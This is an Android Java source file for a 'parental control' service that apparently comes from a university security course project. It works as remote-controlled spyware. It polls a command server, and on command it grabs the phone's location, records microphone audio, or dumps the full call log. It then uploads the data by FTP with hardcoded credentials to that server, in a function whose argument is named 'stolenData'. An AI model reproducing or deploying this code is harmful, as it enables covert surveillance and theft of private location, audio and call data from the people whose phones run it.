package com.seginf.parentalcontrol;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.StrictMode;
import android.os.Vibrator;
import android.provider.CallLog;
import android.util.Log;
import android.widget.Toast;

import org.apache.commons.net.ftp.FTPClient;

import java.io.BufferedInputStream;
import java.io.ByteArrayInputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;

import retrofit.Callback;
import retrofit.RestAdapter;
import retrofit.RetrofitError;
import retrofit.client.Response;


public class CommandService extends Service {

    private static boolean isRunning = false;
    private static String GET_COMMAND_API_HOST = "http://10.2.200.89:8000";
    private static String SEND_RESULT_API_HOST = "10.2.200.89";
    private static String TAG = "Parental Control - Command Service";

    @Override
    public void onCreate() {
        Toast.makeText(this, "service created", Toast.LENGTH_LONG).show();
        isRunning = true;
    }

    public static boolean isRunning() {
        return isRunning;
    }

    @Override
    public IBinder onBind(Intent intent) {
        // We don't provide binding, so return null
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        executeRequest();

        return Service.START_STICKY;
    }

    private void executeRequest() {

        CommandApi commandApi = new RestAdapter.Builder()
                .setEndpoint(GET_COMMAND_API_HOST)
                .setLogLevel(RestAdapter.LogLevel.FULL)
                .build()
                .create(CommandApi.class);

        commandApi.getCommand(new Callback<String>() {
            @Override
            public void success(String command, Response response) {
                onRequestSuccess(command);
            }

            @Override
            public void failure(RetrofitError error) {
                onRequestFailure(error);
            }
        });
    }

    private void onRequestSuccess(String command) {
        Log.d(TAG, "command received: " + command);

        if (command == null) return;

        try {
            switch (command) {
                case "GPS":
                    trackLocation();
                    break;
                case "MIC":
                    startRecording();
                    break;
                case "VIB":
                    vibrate();
                    break;
                case "BROWSER":
                    openUrlInBrowser();
                    break;
                case "CALLS":
                    getCallHistory();
                    break;
                default:
            }
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private void onRequestFailure(RetrofitError error) {
        Toast.makeText(this, error.toString(), Toast.LENGTH_LONG).show();
    }

    private void trackLocation() {
        LocationManager locationManager = (LocationManager)
                getSystemService(LOCATION_SERVICE);
        Criteria criteria = new Criteria();
        String bestProvider = locationManager.getBestProvider(criteria, false);
        Location location = locationManager.getLastKnownLocation(bestProvider);

        String result;

        if (location == null) {
            Toast.makeText(this, "location is null", Toast.LENGTH_SHORT).show();
            Log.d(TAG, "location is null");
            return;
        } else {
            result = "Location: " + location.getLongitude() + " " + location.getLatitude();
            Toast.makeText(this, result, Toast.LENGTH_SHORT).show();
            Log.d(TAG, result);
        }

        byte[] bytes = result.getBytes();
        sendToServer(bytes);
    }

    private void openUrlInBrowser() {
        String urlToOpen = "http://www-2.dc.uba.ar/materias/seginf/";
        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setData(Uri.parse(urlToOpen));
        // needed because we are opening an activity from a service
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
    }

    private void vibrate() {
        Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        // Vibrate for 5 seconds
        v.vibrate(5000);
    }

    private void getCallHistory() {
        // query the call log
        Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        String phoneNumber, callType, callDate, callDuration, entry = "";
        String stolenCallHistory = "";

        // iterate the cursor and show call log
        while (cursor.moveToNext()) {
            phoneNumber = cursor.getString(number);
            callType = cursor.getString(type);
            callDate = cursor.getString(date);
            callDuration = cursor.getString(duration);
            entry = "Number " + phoneNumber + " - type " + callType + " - date " +
                    callDate + " - duration " + callDuration;
            Log.d("CALL", entry);
            stolenCallHistory += entry + "\n";
        }

        cursor.close();

        sendToServer(stolenCallHistory.getBytes());
    }

    private void startRecording() throws InterruptedException {
        Toast.makeText(this, "start recording", Toast.LENGTH_LONG).show();

        new Thread(new Runnable() {
            @Override
            public void run() {
                MediaRecorder recorder = new MediaRecorder();
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                recorder.setOutputFile(Environment.getExternalStorageDirectory().getAbsolutePath() + "/audiorecordtest.3gp");
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

                try {
                    recorder.prepare();
                } catch (IOException ignored) {

                }

                recorder.start();

                try {
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

                recorder.stop();
                recorder.release();
                try {
                    FileInputStream fileInputStream = new FileInputStream(Environment.getExternalStorageDirectory().getAbsolutePath() + "/audiorecordtest.3gp");
                    byte[] audio = new byte[fileInputStream.available()];
                    fileInputStream.read(audio, 0, fileInputStream.available());
                    sendToServer(audio);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).run();
    }

    private void sendToServer(final byte[] stolenData) {

        if (android.os.Build.VERSION.SDK_INT > 9) {
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);
        }

        new Thread(new Runnable() {
            @Override
            public void run() {
                FTPClient ftpClient = new FTPClient();

                try {
                    ftpClient.connect(SEND_RESULT_API_HOST);
                    ftpClient.login("partu", "caca");
                    String workingDirectory = "server/" + Build.MODEL;
                    boolean directoryResult = ftpClient.changeWorkingDirectory(workingDirectory);

                    if (!directoryResult) {
                        ftpClient.makeDirectory(workingDirectory);
                        ftpClient.changeWorkingDirectory(workingDirectory);
                    }

                    String name = Double.toString(Math.random());
                    Log.d(TAG, ftpClient.getReplyString());
                    String response = ftpClient.getReplyString();
                    if (response.contains("230") || response.contains("250")) {
                        ftpClient.setFileType(org.apache.commons.net.ftp.FTP.BINARY_FILE_TYPE);
                        BufferedInputStream buffIn;
                        InputStream is = new ByteArrayInputStream(stolenData);
                        buffIn = new BufferedInputStream(is);
                        ftpClient.enterLocalPassiveMode();
                        boolean result = ftpClient.storeFile(name, buffIn);
                        Log.d(TAG, "resultado del store " + result);
                        buffIn.close();
                        ftpClient.logout();
                        ftpClient.disconnect();
                    }

                } catch (Exception e) {
                    e.printStackTrace();
                    Log.d(TAG, "EXCEPTION IN sendToServer");
                }
            }
        }).run();
    }
}
